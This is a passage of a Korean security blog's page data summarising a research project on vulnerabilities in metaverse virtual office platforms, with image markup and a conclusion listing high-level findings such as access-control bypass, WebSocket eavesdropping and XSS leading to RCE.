url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACQElEQVQoz3WR3UtTcRjHve3f6Kar6LaLICi6iKIu8iK7KS+UKGapvdELhuEbpEaiTSdpBNor4jRzbpYbWzLbkLY13VbnbG6e+b6p2TnZ2T6xo5sv4Rd+8Hu+8Hx4nu+Tl06nySitqkTDYeLxKDPxGOuKrPmSFMNqtTFsthARRLIKBgO43W7tBQKBDUY6TV5qEzi1sMCtykdcL6vj9NlihmxOFmXQ6Sppbm6kQf+Ed+bBHNBkstDa2ob+mR673aF5qVRqCzg2LWGwj/LYOMHRmm663/RgqW3iwP4TlBTepvBOE/dq9Mh2K2uSRH+Hh0mPiMs1yrDFjCAIGicvu7LyWyYihnlp7KOu3YCts4O+omscPniKrs4hWpt6aSm5T6j6IabPY+g+OqkyfqHkRjuldxtJJBK7gMoforFp1lZX4O86obkFap87yL/YwIP6F1Tbxjn3vh+3NItTlLD+iOENx7E6/ExNz29lmP1klY1gLpHkg81F14ADi9PHp5CE0ePH9M2Hb2qWqDhHPD6PrCg5mAbMXXnTyNbLKwqvjX4KLhsor2hHEGY03x6JEUwus13b+/YEzsyv8rbPS3lFN1UNr5iYjNATXOT84BhlI/bMKjt6chOyS5nTZ+QaD1Gsq+dKaSNFV2sxdPTSZv7KvkNnuFDzdGOIVGpHXNqEu4GqugEcHnFx5Ngl8gvKOX6ymNKbdSTWZAYGbXhDItuzVxSFZDKJqqr/A7cy/IXHF8Q/+RPv9yCCGN0zN1mWWVpa0oD/ACj/ArR7bObJAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"45 – 1.png\"\n        title=\"45 – 1.png\"\n        src=\"/static/e21b93b40acd173b390a0cb4c2f49fb2/37523/45__1.png\"\n        srcset=\"/static/e21b93b40acd173b390a0cb4c2f49fb2/e9ff0/45__1.png 180w,\n/static/e21b93b40acd173b390a0cb4c2f49fb2/f21e7/45__1.png 360w,\n/static/e21b93b40acd173b390a0cb4c2f49fb2/37523/45__1.png 720w,\n/static/e21b93b40acd173b390a0cb4c2f49fb2/302a4/45__1.png 1080w,\n/static/e21b93b40acd173b390a0cb4c2f49fb2/07a9c/45__1.png 1440w,\n/static/e21b93b40acd173b390a0cb4c2f49fb2/29114/45__1.png 1920w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"horizon-workrooms\" style=\"position:relative;\"><a href=\"#horizon-workrooms\" aria-label=\"horizon workrooms permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Horizon Workrooms</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAAC7klEQVQoz0XTT0yTBxzGcU8aTwuiHvRgnAIudh40wtSIDDjMVUxED1XGthQajUaBuRUE0eIsKbZgBYRClYkof1apmIKvQBHLWpyBIm+p8kdJ1kaMKbBMiW0Mga+hyfJefsnzO3yS5/AsA5ifn2d4YAiX3Yn1z/v0d9zlaWcrJlMt5utmhAaBh2126uqqaWmop8PWjtVyD6FdoFvoxNHzmFAotESxbOm88U+hSFRQoMpDZ6iiVpvF+ZwfSVZkknnwF7ITLnLyaCHZqjMoFUrkqmyKtDqulpTyQ8p+IlcsxyOKEvhuaorjhxWYqyrxvfUzNjqGWqPmStlN2k0Ojh36iZNHT9N98ymG4jJUeWpGRjz4/f9QeqmQiJURDA4OS+B/M28oPpNMUqyM2B27iYvbxp7tm1F+n4A2PZXM/XtQyRPQpKeSvlPGhi+Ws0UmY+v2b1gXGcHO9auYHB+VwLkP72luMCGP/45DexUY1Hosd+7jetTMmKOFv+1tOIR7eHubGBRacAptNFtb0ZZVoSsxYCo3Mvn6tQQuVczNz0dXVEpng52/6l24hCEmJ17R88RJr6Mfp8tNRbUFQ/kdhK4+vN5RctW/ERu3i33fJtHZ1SWBw8Mi+xIT2R0bT97PZTxqcSI881LUaiEqKoYkuRxzYxM5BZc5f/kqVmsHjr5+5CkHiFy9hjVr12IwGCTQ7XYTFfMVX26Kxqi7hc3cQ1O7iwtWCxs3RhOfmoy6toCCWxpuPKjD2dvH8+dDmGpquKgpQpWRwcGUFAkcGBgkOmYLW2Vfo0g9gqmigsetHTRX1pGXpeZcVi6Xzmmo0VdT/ruRypJyGv9oJBCY5mPoE6L7GTnZWRIoiiJKpZJfz54lLS2NK3o9Pp+f+tu3sdlsaIu1nDh1ItzkpfcFI6IHj+hBr9djNF7jQmE+dnu3BC4sLITD4uIi/+dgMMiHuTmmZ2eYnplm9t9ZgqFQ+B8MBcPL8Pl8jI+PMzHxikAgEF7cZ2DPexB1yF+RAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"54 – 2.png\"\n        title=\"54 – 2.png\"\n        src=\"/static/94e6b93c53fa646d55e635713f440df5/37523/54__2.png\"\n        srcset=\"/static/94e6b93c53fa646d55e635713f440df5/e9ff0/54__2.png 180w,\n/static/94e6b93c53fa646d55e635713f440df5/f21e7/54__2.png 360w,\n/static/94e6b93c53fa646d55e635713f440df5/37523/54__2.png 720w,\n/static/94e6b93c53fa646d55e635713f440df5/302a4/54__2.png 1080w,\n/static/94e6b93c53fa646d55e635713f440df5/07a9c/54__2.png 1440w,\n/static/94e6b93c53fa646d55e635713f440df5/29114/54__2.png 1920w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"metaverse-virtual-office-platform-common-attack-impact-list\" style=\"position:relative;\"><a href=\"#metaverse-virtual-office-platform-common-attack-impact-list\" aria-label=\"metaverse virtual office platform common attack impact list permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>MetaVerse Virtual Office Platform Common Attack Impact List</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAAC30lEQVQozyWR709aBxSG+ff2wWTZF/fFpJqYZpuJ2fhg1qVLszWmVtsIrK3WgIDiBbkFAa1SEK4IFLmKgoqACBZQfmhJJKKDOJ/F25Oc5OQk583zvkf1tdZl3Z3D506y6cvhdaZZ+5DG+yHLmpghsJLBJezgEQ5YsuyxYjtA+phn05dV7tzCHlsbBbZD5zTr/6HakVrMTVSwTxcR/skjvr1g8vdd1H0O1H1LuGbLRNxdlg0t/MItVl2Z10/CGF7JjI+EMU7kmHoRYeKJhOQpobqsdjktnrEj77Mtp6hXWwQDIcZf/8WkbgzRsUB8O0z4s59oLMiC1Ujfo14GHz/i+x++IxT2I234cC0vUqs2UdUrXRJyDqfdi2cpwHG6wWYwwczMexZtdt69m0KvNzA29hJRdBBYl/jtVzW9vT8yOPiY49wJ2UwOWZbp3IDqS/6KRDyD5I/j90Y5TJZZcQd59uxPtBotOp0OrVZLIpHg/PycRqOBIAiMjo5itVoplcoIgpV5yxynJzVUZ8U2xfwFnzdTxCL7VMs32IUVfv7lJ0ZGRhgeHkatVmMwGDCbzbx585b+/n4GBgbo6elBkjbwuD0YTbN8bbRRVQrXlApNUrsF9vcKVEs3SOtx3s9Ms7q6iiiKxGIxut2u0vVaHaPRyNDQEHq9nna7TSqVIi5vcXvNN8GPHgm7dRmb4CYUSCjWxydeUigUqdfrXF5eKmIPlclkFVKLxcL8/DzlUplwOILP5+Wq2UHVqHRJJvK4HD5sC25y6RpB/xYa7SRTU9OYTCai0Sh3d3fc38PRUUbZOZ1OhTQejysurDaBo8PTB8Ibdh++LH7C5fCTPawp89Onf/D87+d4vV7K5TKdTkcRrVTOFDqNRqM8JX+cx2JZwDxn4stJHdVDZplUDf+aTGg9yWmuRUQ6wLrgxCmuYp5dJOCLcn11p4Tebt1zdFDE5fhEMV+lewsJOc1WNEnz4l/+B+acwiITUgZUAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"common-attack-Impact.png\"\n        title=\"common-attack-Impact.png\"\n        src=\"/static/75d6cfa75c8a71d24b09c6df3fd6f723/37523/common-attack-Impact.png\"\n        srcset=\"/static/75d6cfa75c8a71d24b09c6df3fd6f723/e9ff0/common-attack-Impact.png 180w,\n/static/75d6cfa75c8a71d24b09c6df3fd6f723/f21e7/common-attack-Impact.png 360w,\n/static/75d6cfa75c8a71d24b09c6df3fd6f723/37523/common-attack-Impact.png 720w,\n/static/75d6cfa75c8a71d24b09c6df3fd6f723/302a4/common-attack-Impact.png 1080w,\n/static/75d6cfa75c8a71d24b09c6df3fd6f723/07a9c/common-attack-Impact.png 1440w,\n/static/75d6cfa75c8a71d24b09c6df3fd6f723/c6720/common-attack-Impact.png 1922w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>메타버스 가상오피스 플랫폼에서만 발생할 수 있는 공격 영향을 선정하여 실제 가상 오피스에서 보안 위협이 발생하였을 때 위협이 될 만한 자원 대상별 공격 영향을 산출하였다. 각 공격 영향을 산출하여 핵심적으로 취약점과 연관된 영향 총 10가지를 선정하였다. 도청은 가상 오피스에서 회의 나 1:1 대화 시 송수신되는 데이터를 중간에서 가로채는 방식으로 엿듣는 과정이 실제 물리적 환경이 아닌 사이버 공간에서 발생하여 파급력이 높으며 시공간 제약 없이 내부 데이터를 실시간으로 훔쳐 올 수 있는 피해가 존재합니다.</p>\n<p>정보 노출은 현실의 기업에서도 내부 기밀 유출에 대해 내부, 외부 상관없이 보안 측면에서 신경을 많이 쓰지만 사이버 공간에서 데이터가 밀접하게 노출된 가상 오피스에서는 민감 데이터의 노출 여부가 엄청난 파급력이 발생합니다.</p>\n<p>그 외에도 다양한 리스트에 정리한 임팩트 부분에서 실제 물리적 환경에서 발생할 수 없는 케이스로 DOS로 가상의 공간에서 DOS로 인해 회사 업무를 처리할 수 없는 상황이 발생할 수 있으며 외부의 사용자가 회사 내에 접근하여 데이터 탈취가 가능할 수 있고 실제 회사에서만 사용할 수 있는 기능, 제품을 강제로 사용할 수 있는 부분 등 리스트에 열거한 공격 임팩트가 가상 오피스에 발생할 수 있습니다.</p>\n<p>다음 대표적으로 가상 오피스를 운영하는 애플리케이션 환경에서 로직 적 결함 및 버그 케이스로 인하여 RCE 취약점이 허용되면 기존의 물리적 환경에서의 기업을 운영하는 처지에서 기업 내부망에 결함이 생긴 것은 동일하지만 왜/내부망 상관없이 가상 오피스에서는 실제 기업 환경의 내부에 침입하여 매우 위험한 상황이 발생할 수 있습니다.</p>\n<h1 id=\"conclusion\" style=\"position:relative;\"><a href=\"#conclusion\" aria-label=\"conclusion permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Conclusion</h1>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 132.7777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAbCAYAAAB836/YAAAACXBIWXMAAAsTAAALEwEAmpwYAAAFL0lEQVRIx3VVW2xUVRTd8uVXZ6YxNU0MiSMhmBgjpfKm1BgV0SBoIgkhEhODxuhHTZAY/FA+UAraKCmVCHwIKArhUWJAwBDUdlpsaTvTmc6r08e0Q2k773Ze95y9zDl3OgwUT7Jz9t13n3XX2vucc4mIXiait4loQ3GuL8beIqLnieg1IlpDRDVEtKX47iUierOYv6n4fnPxPT1hs9merq6uXmK1WtfZbLYVVqt1jcViWV9VVfWMxWKps1qtaysrK5fZbLaVyiorK5dbLJZ6lWe1Wlfb7faFFRUVtUS0hBYsWEDNzc1069YtBb6ciOqIaDERvUBES4sslb+SiJ4koheJaC0RPUdEr6pYa2srNTU1aSwCQIVCYauU8hCArwA0AtjPzGo+MPc8a86NkDgoJR9UsaI1CiEOZTKZbQqLmHkxADCzNikl5kZ3txsXr97E1PlrSF+6iRu+FOK5NBgCgmVpjRpqndfrfZaklLXFYF5KNgAYzGzs/rzJqHhshVH3+k6je/8xI9v4s7Hr3F3j2OG0EesxdB7YzFVrFUZ/f3+9Alxa/JKUUiNzw65GtlWv4Z9OXeJcLs8SYAFwzgD/dW6GP7t6gb8bushKlxYHlgrD5XKtU4A1ip4QQmnlP663w1K1Cudb/8RcKaQQEIYBVrAA9gRP45Fr7yOcTukUySXAOg2oHoTQxeNtO3Zjw6YP9ELDMO6rqfYlkBUFXHB8guTgVfWo5M0HVPlK3op127Cv8ccSoBoOhwPt7e0mqChAZ3duB1+vVT5rklLeA5TSBJyZyXDt6q1o+v5ECTCfz6O3txd9fX3I5XJgaUAJF7c/Bl9frguo1t4HONcUJXnj5g+x4709GjCfyyMajSIej+t5cvIupCqDSrxRB27bYjJkcb9kk43ZlCNHz+DxhesxEBgymyLMupkmTblTV4BfCTz6m06ZB1jOMJ8vYP0r76J+9TtID8fMuulVpmW7kkgf34787Z1qaxQZljeF2WyKZCkMoQkMjAzj6EdHMLrsNKJ7OpA+F0T6TADTn7Yh/NQJRPa1IVP8EpsdLQMUosbkbRLh4hYxcjkkW1y4s/ESxleexfiqs7jzxu9IHvdAzqjuC/PoAQ8AAjWYzQLDEYnhCHMyjUQqhUw2U9rYYjIDMZUBo2wUPz2PIYAaMXIHuZOXZe7kZc47A/AOBjE2GlZpKrNUP81IyDlm5qGbD8g1oZTEEZ8hf/AJ7p4yMDo0iAGvF263W+8/n9eHgD9QRo7L/QcBRU0sDDhOQbafBI+7gZFwCF6vDwMDA3A6nfB4POomQTAYVGce5dfdQyUPRKPY2+mQX3S0c1tkHEPBIHx+P2ZnZ5FMJpFIJLSl0+l5LB8KOJYO4LT/gPzF38ieaAdGQmGMjI6gUCggk8no45fNZjEzM1MC/V+GhupyLAB0fivReZAx1oFAaBTufhcCgYCWq6QruV6vF6FQ6N61JnWD2LxLZYnh0pwvheg3PhE94ONsZ5T9QwEecHvY5XKxx+Nhp9PJ4XCYyw4MF5nNmSiXvMzrD2Hv14fx5b5m/OPoxthYGH6/XzNSDJU/x1Q1KRwOa5aK7cTEhL6FVHncbne9AqyIx5N/Dw2Fc4Oh0WQslkglk8nU9PR0Kh6PpxKJRCoWi2l/ampKx1UMQMrpdKa6urqShUIhG41G/21paanWv9FQoP/RRGxiUWw6Yu939tq7u2/b3W63va+vz97T02N3uVza93q9do/Ho2NXrlyxT05O2iORiN3hcCxqaGioUL/R/wCpDrvu5mr74gAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"vuln-chart-.png\"\n        title=\"vuln-chart-.png\"\n        src=\"/static/93262f560ed14aa94d7966d31ab636ce/37523/vuln-chart-.png\"\n        srcset=\"/static/93262f560ed14aa94d7966d31ab636ce/e9ff0/vuln-chart-.png 180w,\n/static/93262f560ed14aa94d7966d31ab636ce/f21e7/vuln-chart-.png 360w,\n/static/93262f560ed14aa94d7966d31ab636ce/37523/vuln-chart-.png 720w,\n/static/93262f560ed14aa94d7966d31ab636ce/a1792/vuln-chart-.png 780w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>BoB 프로젝트를 통해 약 4개월간 취약점에 대한 경각심을 갖고 사용 메타버스 기반 가상 오피스 플랫폼에 대한 보안성 향상을 목적으로 분석을 진행하였습니다. 총 31건의 취약점을 발견할 수 있었습니다. 분석을 진행하였던 5개의 플랫폼에서 각기 다른 웹/바이너리 애플리케이션 환경에서 저희가 구성한 취약점 분석 방법론에 맞춰서 분석을 진행하였습니다. 공격 벡터 선정에 있어서 13가지의 가상 오피스 공통 기능과 기술 스택을 기반으로 아키텍처를 구성하여 각각의 hotspot, coldspot 영역을 참고하면서 기능적 흐름에서 버그가 발생하는 부분에 대해 Security Misconfiguration 취약점이 큰 비중을 차지하여 로직 버그가 발생하였습니다. 로직 버그 취약점을 활용하여 공격 시나리오에서 연계 공격으로 DOS, 기능 우회 방안 등 이용할 수 있었습니다.</p>\n<p>대상 애플리케이션 환경에서 Third-party API와 Origin-API를 활용하여 통신하는 과정에서 API Manipulation 취약점을 활용해 특이성을 발생 시켜 권한 상승, 정보 노출 등 크리티컬한 취약점까지 연계가 가능하였습니다. 가상 오피스에서 자신의 아바타를 이동하거나, 다양한 콘텐츠를 활용하는 경우 web Socket을 활용하여 실시간으로 데이터를 처리하는 데 있어 클라이언트 환경에서 서버 측으로 받아온 데이터 처리가 미흡하여 발생한 Socket Manipulation 취약성을 통해 음성, 영상 도청 등 내부 콘텐츠에 대한 취약성을 찾을 수 있었습니다.</p>\n<p>현실의 물리적 공간으로 사용되는 회의실, 미팅룸 등 공간적인 개념을 가상 오피스에서는  Space, Room 개체를 활용해서 내부에 Object를 생성하는 기능을 구현하는 데 있어서 각기 다른 방식으로 개발을 진행합니다. 공통된 기능이지만, 오피스에 속하지 않는 사람이 실제 해당 오피스에 접근할 수 없도록 권한 분리 및 접근 통제 기능이 구현되어 있습니다. 하지만 이러한 기능에서 개발적인 실수 로 인하여 접근할 수 없는 사람이 강제적으로 해당 오피스에 접근을 할 수 있어 가상 오피스 내에 데이터를 탈취하거나, 모든 데이터를 삭제하는 등 악의적인 행위를 발생할 수 있는 취약성이 존재하였습니다. 각기 다른 방식으로 구현된 가상 오피스에서는 웹/바이너리에 사용되는 기술에서 Unity Engine과 멀티 플레이 최적화를 위해 Photon Server와 실시간 통신을 하기 위한 WEB RTC 개념이 사용되고 있지만, 개발 당시 클라이언트, 서버 측에서 제대로 권한 관리 및 세션 노출 등 교차 검증이 미흡하여 손쉽게 공격자가 중간에서 데이터를 탈취하거나 데이터를 악의적으로 변조하여 클라이언트 측에서 공격을 수행하는 과정이 발생하였습니다.</p>\n<p>특정 가상 오피스 애플리케이션 환경에서는 구현된 내부 오브젝트로 가상의 책상, 화이트보드, 화면, 화분 등이 사용되고 있습니다. 물리적 환경에서의 회사는 이러한 물건들을 대상으로 시각적인 효과 기능적인 요소로 사용되고 있지만, 가상의 공간에서는 사용자와 밀접한 연관이 있게 되며 평범한 오브젝트라도 사용자 클라이언트 측에서 자원을 사용하게 되어 같은 메모리 공간에 존재하기 때문에 해당 객체의 기능적 결함으로 인한 취약점이 발생하여 사용자에게 공격이 가능한 벡터가 존재합니다. 이번 취약점 분석에서 웹 애플리케이션 환경의 외부 콘텐츠를 불러올 수 있는 객체 기능의 보안 결함으로 XSS 취약점이 발생하여 해당 취약점을 이용해 권한 상승 및 다른 사용자들의 세션 탈취, 내부 함수를 이용한 특정 DOS 등 다양한 공격이 연계될 수 있었으며 또한 code Execution이 가능하여 실제 window/mac OS 환경에서 Remote Code Execution 취약점까지 수행이 되어 실제 가상 사무실을 이용하였을 때 크리티컬한 취약점이 수행될 수 있었습니다.</p>\n<p>본 팀은 기간 내에 성공적으로 목표 달성을 수행하며, 상용 메타버스 기반 가상 오피스 플랫폼 취약점을 연구하고 관련 취약한 부분에 대한 대응책과 취약점 분석 방법론을 공유하며 이후 계속해서 발전하는 메타버스 환경의 취약점을 분석하는 사람들에게 도움이 되었으면 합니다.</p>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#what-is-virtual-office\">What is Virtual office?</a></p>\n</li>\n<li>\n<p><a href=\"#metaverse-virtual-office-platform-service-statistics\">MetaVerse Virtual office platform Service statistics</a></p>\n</li>\n<li>\n<p><a href=\"#project-point\">Project Point</a></p>\n</li>\n<li>\n<p><a href=\"#vulnerability-analysis-methodology\">Vulnerability analysis methodology</a></p>\n</li>\n<li>\n<p><a href=\"#common-functions-for-each-metaverse-virtual-office-platform\">Common functions for each MetaVerse Virtual office platform</a></p>\n</li>\n<li>\n<p><a href=\"#technology-stacks-to-metaverse-virtual-office-platform-enumeration\">Technology Stacks to MetaVerse Virtual office platform Enumeration</a></p>\n</li>\n<li>\n<p><a href=\"#architecture-and-attack-vectors-by-platform\">Architecture and attack vectors by platform</a></p>\n<ul>\n<li><a href=\"#kumospace\">Kumospace</a></li>\n<li><a href=\"#ovice\">oVice</a></li>\n<li><a href=\"#gather\">Gather</a></li>\n<li><a href=\"#spatial\">Spatial</a></li>\n<li><a href=\"#horizon-workrooms\">Horizon Workrooms</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#metaverse-virtual-office-platform-common-attack-impact-list\">MetaVerse Virtual Office Platform Common Attack Impact List</a></p>\n</li>\n</ul>\n</div>","frontmatter":{"date":"December 24, 2020","title":"[KR]Vulnerability analysis of commercial metaverse-based virtual office platform","categories":"projects","author":"Zer0Luck","emoji":"🔎"},"fields":{"slug":"/project_MetaVersPloit/"}},"site":{"siteMetadata":{"siteUrl":"https://dnsdudrla97.github.io","comments":{"utterances":{"repo":"dnsdudrla97/dnsdudrla97.github.io"}}}}},"pageContext":{"slug":"/project_fuzz_/","nextSlug":"/php-sqlite3-1day-rce/","prevSlug":"/project_MetaVersPloit/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}